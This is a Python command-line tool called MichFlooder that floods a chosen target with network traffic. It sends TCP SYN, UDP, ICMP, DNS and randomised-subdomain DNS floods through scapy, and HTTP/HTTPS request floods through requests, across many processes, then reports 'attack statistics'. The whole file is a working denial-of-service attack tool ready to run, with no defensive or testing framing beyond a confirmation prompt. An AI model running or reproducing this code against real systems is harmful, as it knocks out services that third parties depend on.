from random import choices
from datetime import timedelta
from os import cpu_count
from string import ascii_lowercase
from argparse import ArgumentParser
from multiprocessing import Process
from time import strftime, localtime, time, sleep
from requests import Session
from socket import inet_aton, gethostbyname

from scapy.packet import Raw
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.sendrecv import send
from scapy.volatile import RandInt, RandShort, RandChoice, RandIP, RandField

class RandSubDomainDNS(RandField):
    def __init__(self, domain):
        super(RandSubDomainDNS, self).__init__()
        self.domain = domain
        self.dnsqr = DNSQR()

    def _fix(self):
        subdomain = "".join(choices(ascii_lowercase, k=5))
        self.dnsqr.qname = f"{subdomain}.{self.domain}"
        return self.dnsqr

class HashableRandIP(RandIP):
    def __hash__(self):
        return hash(self.ip)

def now():
    return strftime("%H:%M:%S", localtime())

def resolve_domain_to_ip(domain):
    try:
        return gethostbyname(domain)
    except:
        print(f"[!] Could not resolve domain: {domain}")
        exit(1)

def generate_layers(protocol, ports, domain):
    if protocol == "tcp":
        return TCP(sport=RandShort(), dport=RandChoice(*ports), flags="S", seq=RandInt()), Raw()
    elif protocol == "icmp":
        return ICMP(id=RandShort(), seq=RandShort()), Raw()
    else:
        udp = UDP(sport=RandShort(), dport=RandChoice(*ports))
        if protocol == "dns":
            return udp, DNS(id=RandShort(), rd=1, qd=DNSQR(qname=domain))
        elif protocol == "rand_dns":
            return udp, DNS(id=RandShort(), rd=1, qd=RandSubDomainDNS(domain))
        else: # protocol == 'udp'
            return udp, Raw()

def gen_packet(destination_ips, ports, protocol, domain, min_size, count):
    ip_layer = IP(dst=HashableRandIP(destination_ips))
    l4_layer, l7_layer = generate_layers(protocol, ports, domain)
    packet_size = len(ip_layer / l4_layer / l7_layer) + 14
    payload_size = max(0, min_size - packet_size)
    payload = Raw(load=payload_size)
    packet = ip_layer / l4_layer / l7_layer / payload
    if count:
        for _ in range(count):
            yield packet
    else:
        while True:
            yield packet

def send_packets(thread_num, target, ports, protocol, domain, size, interval, count):
    print(f"[{now()}] Thread #{thread_num} started...", flush=True)
    packet_gen = gen_packet(target, ports, protocol, domain, size, count)
    send(packet_gen, verbose=False, inter=interval)
    print(f"[{now()}] Thread #{thread_num} sent {count or '∞'} packets.", flush=True)

def send_requests(thread_num, target_ip, ports, protocol, domain, size, interval, count):
    print(f"[{now()}] Thread #{thread_num} started...", flush=True)
    url = f"{protocol}://{target_ip}"
    port = list(ports)[0]
    if (protocol == "http" and port != 80 ) or (protocol == "https" and port != 443):
        url += f":{port}"
    headers = {
        "User-Agent": "MichFlooder",
        "Connection": "close"
    }
    if domain:
        headers["Host"] = domain
    header_str = ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n"
    packet_len = 40 + len(header_str.encode("utf-8")) + (100 if protocol == "https" else 0)
    data = b'0' * (size-packet_len)
    session = Session()
    try:
        if count:
            sent = 0
            while sent < count:
                session.get(url, headers=headers, verify=False, data=data)
                sent += 1
                if interval:
                    sleep(interval)
        else:
            while True:
                session.get(url, headers=headers, verify=False)
                if interval:
                    sleep(interval)
    except Exception as e:
        print(f"[{now()}] Thread #{thread_num} error: {e}", flush=True)

    print(f"[{now()}] Thread #{thread_num} sent {sent or '∞'} {protocol.upper()} requests.", flush=True)

def parse_ports(port_str):
    ports = set()
    for part in port_str.split(','):
        if '-' in part:
            start, *_, end = part.split('-')
            start = int(start) if start else 1
            end = int(end) if end else 65535
            ports.update(range(start, end + 1))
        else:
            ports.add(int(part))
    return ports

def parse_args():
    parser = ArgumentParser()
    parser.add_argument("target", help="Target IP/CIDR/Domain (Can be given complete protocol://target:port)")
    parser.add_argument("-p", "--port", help="Target port(s), Nmap style: 80,443 or 20-25")
    parser.add_argument("-n", "--count", type=int, help="Number of packets to send (default: infinite)")
    parser.add_argument("-s", "--size", type=int, default=0, help="Packet size in bytes (max: 1450)")
    parser.add_argument("-t", "--threads", type=int, default=cpu_count(), help=f"Number of threads (default: {cpu_count()})")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packets in seconds (e.g. 0.1) (default: 0)")
    parser.add_argument("-d", "--domain", help="Domain to query (for dns/http if target is IP)")
    parser.add_argument("-r", "--rand-domain", action="store_true", help="Randomize subdomain (5-letter lowercase) of given domain.")
    parser.add_argument("-y", "--accept", action="store_true", help="Immediately start, don't ask for confirmation.")

    proto_group = parser.add_argument_group("Protocol", "Choose one of the following protocols to use")
    protocol = proto_group.add_mutually_exclusive_group()
    protocol.add_argument("-P", "--ICMP", "--PING", action="store_const", const="icmp", dest="protocol", help="Use ICMP (Ping)")
    protocol.add_argument("-T", "--TCP", action="store_const", const="tcp", dest="protocol", help="Use TCP SYN")
    protocol.add_argument("-U", "--UDP", action="store_const", const="udp", dest="protocol", help="Use UDP")
    protocol.add_argument("-D", "--DNS", action="store_const", const="dns", dest="protocol", help="Use DNS over UDP")
    protocol.add_argument("-H", "--HTTP", action="store_const", const="http", dest="protocol", help="Use HTTP")
    protocol.add_argument("-S", "--HTTPS", action="store_const", const="https", dest="protocol", help="Use HTTPS")

    args = parser.parse_args()

    if "://" in args.target:
        prot, target = map(str.lower, args.target.split("://"))
        if args.protocol:
            parser.error("Protocol must be given in target or as flag!")
        elif prot in [action.const for action in protocol._group_actions]:
            args.protocol = prot
            args.target = target
        else:
            parser.error("Unknown protocol!")

    if ":" in args.target:
        target, port = args.target.split(":")
        if args.port:
            parser.error("Port must be given in target or standalone!")
        else:
            args.port = port
            args.target = target

    if args.size > 1450:
        parser.error("Min packet size cannot exceed 1450 bytes.")

    if args.count and args.threads > args.count:
        args.threads = args.count

    if not args.port:
        if args.protocol == "dns":
            args.port = "53"
        elif args.protocol == "http":
            args.port = "80"
        elif args.protocol == "https":
            args.port = "443"
        elif args.protocol in ["tcp", "udp"]:
            parser.error("TCP/UDP requires --port.")
    elif args.protocol == "icmp" and args.port != "0":
        parser.error("--port (-p) not allowed with ICMP.")

    ports = parse_ports(args.port) if args.port else {}
    if any(port > 65535 for port in ports):
        parser.error("Ports cannot exceed 65535")

    if args.protocol in ["http", "https"]:
        if len(ports) != 1:
            parser.error(f"{args.protocol.upper()} must be given exactly 1 port.")
        if "/" in args.target:
            parser.error(f"{args.protocol.upper()} must be given exactly 1 IP address.")

    if not args.protocol:
        parser.error(f"Did not specify protocol!.")
    if not args.port:
        parser.error(f"{args.protocol.upper()} must be given at lease 1 port.")

    try:
        inet_aton(args.target)
    except:
        if not args.domain:
            args.domain = args.target
        resolved_ip = resolve_domain_to_ip(args.target)
        args.target = resolved_ip

    if args.domain:
        if args.protocol not in ["dns", "http", "https"]:
            parser.error("-d (--domain) requires DNS/HTTP/HTTPS.")
        elif args.rand_domain:
            args.protocol = f"rand_{args.protocol}"
    else:
        if args.protocol == "dns":
            parser.error(f"DNS requires --domain.")
        if args.rand_domain:
            parser.error("-r (--rand-domain) requires --domain.")

    return args, ports

def print_stats(start_time, packet_size, packets_sent):
    end_time = time()
    start_str = strftime('%H:%M:%S', localtime(start_time))
    end_str = strftime('%H:%M:%S', localtime(end_time))
    elapsed_time = end_time - start_time
    elapsed_time_str = str(timedelta(seconds=int(elapsed_time)))

    print("\n===== Attack Statistics =====")
    print(f"Start Time   : {start_str}")
    print(f"End Time     : {end_str}")
    print(f"Time Taken   : {elapsed_time_str}")

    if packets_sent:
        total_MB = (packet_size * packets_sent) / (1024 ** 2)
        print(f"Packets Sent : {packets_sent:,}")
        print(f"Total Volume : {total_MB:.2f} MB")
        print(f"Avg          : {total_MB / elapsed_time:,.2f} MB/s")
        print(f"               {packets_sent / elapsed_time:,.2f} PPS")

def main():
    print("\n======================")
    print("==                  ==")
    print("== MichFlooder v1.0 ==")
    print("==  By MichelCohen  ==")
    print("==                  ==")
    print("======================\n")

    args, ports = parse_args()
    print('\n'.join(f"{k:<9} = {v}" for k, v in vars(args).items() if v))

    packet_count = args.count // args.threads if args.count else None

    if not args.accept:
        input("Press Enter to start sending...")

    print(f"\n[{now()}] Sending packets...\n")
    start_time = time()

    processes = []
    for thread_num in range(args.threads):
        process = Process(
            target=send_requests if args.protocol in ["http", "https"] else send_packets,
            args=(thread_num, args.target, ports, args.protocol, args.domain, args.size, args.interval * args.threads, packet_count)
        )
        process.start()
        processes.append(process)

    try:
        for process in processes:
            process.join()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected! Terminating...")
        for process in processes:
            process.terminate()
        for process in processes:
            process.join()

    if args.protocol in ["http", "https"]:
        packet_size = 150  # estimate
    else:
        packet_size = len(next(gen_packet(args.target, ports, args.protocol, args.domain, args.size, 1)))
    print_stats(start_time, packet_size + 14, args.count)

if __name__ == "__main__":
    main()
